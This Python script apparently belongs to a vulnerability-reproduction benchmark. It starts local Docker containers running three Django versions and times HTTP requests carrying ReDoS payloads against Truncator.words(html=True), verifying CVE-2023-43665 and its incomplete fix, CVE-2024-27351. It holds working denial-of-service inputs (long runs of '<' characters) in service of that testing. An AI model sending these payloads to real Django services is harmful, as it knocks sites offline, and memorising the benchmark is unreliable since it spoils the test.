#!/usr/bin/env python3
"""dos-threshold oracle for Django Truncator.words(html=True) ReDoS over a REAL HTTP service
(CVE-2023-43665 -> CVE-2024-27351).

No flag token: the signal is SERVER-SIDE latency of an EXTERNAL HTTP request. For each version
{v0=4.2.5, v1=4.2.6, v2=4.2.11} we bring up a REAL Django project (gunicorn + proj/) running the
REAL published Django. The endpoint POST /truncate reads the untrusted request body and feeds it
to django.utils.text.Truncator(text).words(30, html=True) -- the exact sink behind the
`truncatewords_html` template filter -- inside a SYNCHRONOUS gunicorn worker. The oracle POSTs
three payloads {original, residual, benign} from OUTSIDE the container and measures the HTTP
round-trip latency (dominated by the server-side regex compute); a catastrophic input hangs the
response until the HTTP read timeout.

GATE booleans (T_FAST=300ms, T_SLOW=2000ms, HTTP read timeout=10s):
  original_slow_on_v0    : v0.original latency > T_SLOW   (CVE-2023-43665 unbounded-input vector fires on V0)
  original_bounded_on_v1 : v1.original latency < T_SLOW   (4.2.6's MAX_LENGTH_HTML=5M cap truncates the past-cap bracket tail)
  residual_slow_on_v1    : v1.residual latency > T_SLOW   (V1 fix INCOMPLETE: within-cap bracket run still O(n^2))
  residual_fast_on_v2    : v2.residual latency < T_FAST   (4.2.11 linear WordsRegex scanner closes the residual)
  benign_fast_on_all     : every version's benign latency < T_FAST
  residual_v1_over_v2_gt_50x : clean latency separation on V1 vs V2 for the residual
  passed = all of the above
"""
from __future__ import annotations
import http.client
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE = ["docker", "compose", "-f", os.path.join(HERE, "docker-compose.yml")]
ENV = {**os.environ, "PCB_FLAG": "dos-threshold-no-canary"}

T_FAST = 300.0        # ms  (external HTTP round-trip for a bounded truncation + JSON)
T_SLOW = 2000.0       # ms
HTTP_TIMEOUT_S = 10.0
HTTP_TIMEOUT_MS = HTTP_TIMEOUT_S * 1000.0

PORTS = {"v0": 29140, "v1": 29141, "v2": 29142}

PAYLOADS = {
    # original CVE-2023-43665 vector: 5,000,000-char whitespace prefix + a 30,000 open-bracket run.
    # The bad bracket run sits BEYOND the 5M point: V1's MAX_LENGTH_HTML=5M truncation cuts it off
    # (whitespace-only remainder -> bounded), while V0 (no cap) processes the O(n^2) bracket tail.
    "original": "\t" * 5_000_000 + "<" * 30_000,
    # residual CVE-2024-27351 vector: a 30,000 open-bracket run entirely WITHIN the 5M cap. V1's
    # truncation never triggers, so the UNCHANGED re_words regex still backtracks O(n^2) on V1;
    # V2's linear WordsRegex scanner handles it in O(n). Same shape as Django's own regression
    # test `test = '<' * 60_000`.
    "residual": "<" * 30_000,
    # benign control: well-formed HTML exercising the words+tags path; fast everywhere.
    "benign": "<p>Joel is a slug</p>" * 40,
}


def run(cmd, **kw):
    print("+", " ".join(cmd), flush=True)
    return subprocess.run(cmd, env=ENV, **kw)


def wait_health(port: int, timeout_s: float = 120.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/healthz")
            r = c.getresponse()
            body = r.read()
            c.close()
            if r.status == 200 and b"ok" in body:
                return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(1.0)
    return False


def probe(port: int, payload: str) -> dict:
    """POST /truncate with the raw payload as the request body; measure external HTTP round-trip
    latency (ms). On catastrophic backtracking the gunicorn worker is held -> socket read timeout
    -> recorded as HTTP_TIMEOUT_MS."""
    body = payload.encode("utf-8")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/truncate", body=body,
                  headers={"Content-Type": "text/plain; charset=utf-8",
                           "Content-Length": str(len(body))})
        r = c.getresponse()
        resp = r.read()
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(ms, 1), "timeout": False, "len": len(payload),
                "resp": resp.decode("utf-8", "replace")[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(max(ms, HTTP_TIMEOUT_MS), 1), "timeout": True, "len": len(payload), "resp": None}
    except OSError as e:
        return {"ms": -1.0, "timeout": False, "error": str(e), "len": len(payload), "resp": None}


def measure_profile(prof: str) -> dict:
    """Measure each payload against a FRESH server. A synchronous ReDoS holds the single gunicorn
    worker for the whole regex compute; if a probe hit the 10s client timeout the worker would still
    be busy server-side, so we restart (kill + up -d -> brand-new gunicorn) before EVERY probe to
    guarantee a clean, idle worker per measurement."""
    port = PORTS[prof]
    results = {}
    try:
        for kind in ("original", "residual", "benign"):
            run(COMPOSE + ["--profile", prof, "stop", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "rm", "-f", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "up", "-d"], check=True,
                capture_output=True, text=True)
            if not wait_health(port):
                raise RuntimeError(f"{prof}: /healthz never came up on :{port}")
            r = probe(port, PAYLOADS[kind])
            results[kind] = r
            print(f"[{prof}] {kind:9s} len={r['len']:>9} -> {r['ms']:>8}ms timeout={r.get('timeout')}",
                  flush=True)
        return {"version": prof, "port": port, "results": results}
    finally:
        run(COMPOSE + ["--profile", prof, "kill", prof], check=False,
            capture_output=True, text=True)
        run(COMPOSE + ["--profile", prof, "down"], check=False,
            capture_output=True, text=True)


def build_profile(prof: str):
    run(COMPOSE + ["--profile", prof, "build", prof], check=True)


def main():
    t_start = time.time()
    versions = {}
    for prof in ("v0", "v1", "v2"):
        build_profile(prof)
        versions[prof] = measure_profile(prof)

    def ms(v, kind):
        return versions[v]["results"][kind]["ms"]

    matrix = {v: {k: versions[v]["results"][k]["ms"] for k in ("original", "residual", "benign")}
              for v in versions}

    booleans = {
        "original_slow_on_v0": ms("v0", "original") > T_SLOW,
        "original_bounded_on_v1": ms("v1", "original") < T_SLOW,
        "residual_slow_on_v1": ms("v1", "residual") > T_SLOW,
        "residual_fast_on_v2": ms("v2", "residual") < T_FAST,
        "benign_fast_on_all": all(ms(v, "benign") < T_FAST for v in versions),
    }
    resid_v1, resid_v2 = ms("v1", "residual"), max(ms("v2", "residual"), 0.001)
    booleans["residual_v1_over_v2_gt_50x"] = (resid_v1 / resid_v2) > 50.0
    booleans["passed"] = all(booleans.values())

    report = {
        "case": "redos_django_truncator",
        "oracle_variant": "dos-threshold",
        "run_mode": "real-app-http",
        "external_http_trigger": True,
        "thresholds": {"T_FAST_ms": T_FAST, "T_SLOW_ms": T_SLOW, "http_timeout_ms": HTTP_TIMEOUT_MS},
        "payloads": {k: {"len": len(v), "shape": ("\\t*5,000,000 + <*30,000" if k == "original"
                                                  else "<*30,000" if k == "residual"
                                                  else "<p>Joel is a slug</p>*40")}
                     for k, v in PAYLOADS.items()},
        "versions": {"v0": "Django 4.2.5", "v1": "Django 4.2.6", "v2": "Django 4.2.11"},
        "latency_matrix_ms": matrix,
        "residual_v1_over_v2_ratio": round(resid_v1 / resid_v2, 1),
        "booleans": booleans,
        "elapsed_s": round(time.time() - t_start, 1),
    }
    print("\n=== GATE REPORT ===")
    print(json.dumps(report, indent=2))
    with open(os.path.join(HERE, "gate_result.json"), "w") as f:
        json.dump(report, f, indent=2)
    return 0 if booleans["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
